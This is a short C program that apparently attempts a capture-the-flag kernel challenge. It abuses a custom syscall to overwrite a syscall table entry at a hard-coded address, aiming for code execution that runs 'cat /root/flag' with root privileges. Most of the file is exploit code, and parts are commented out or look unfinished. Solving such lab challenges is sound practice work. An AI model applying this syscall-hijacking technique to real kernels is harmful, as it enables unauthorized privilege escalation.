#include "stdio.h"
#include <sys/syscall.h>
#define NR_SYS_UNUSED		223
#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define KERN_START 0xC0000000
unsigned int** sct;

void cat_flag()
{
	system("/bin/cat /root/flag");
}
int main()
{	
	char in[5] = {'a', 'B', 'C', 'd', '\x00'};
	*(int*)in = *(int*)cat_flag;
	int i;
	for (i = 0; i < 5; i++)
	{
		printf("%02x->%02x\n", in[i], ((char*)cat_flag)[i]);
	}
	char *out;

	sct = (unsigned int**)SYS_CALL_TABLE;
	//sct[NR_SYS_UNUSED] = sys_upper;

	//char sys_addr[10000] = {'\x00'};
	//syscall(NR_SYS_UNUSED, out, sys_addr);
	//printf("%s\n", sys_addr);
	out = &sct[NR_SYS_UNUSED];
	//printf("syscall: 	%08x\n", *(int*)(0x8000e348 + 4*NR_SYS_UNUSED));
	printf("cat_flag: 	%08x\n", *(int*)(cat_flag));

	syscall(NR_SYS_UNUSED, in, out - KERN_START);
	printf("in:%s\n", in);

	//printf("syscall: 	%08x\n", *(int*)(0x8000e348 + 4*NR_SYS_UNUSED));
	//printf("cat_flag: 	%08x\n", *(int*)(cat_flag));
	syscall(NR_SYS_UNUSED, in, out - KERN_START);
	//printf("out:%s\n", out);
	return 0;
}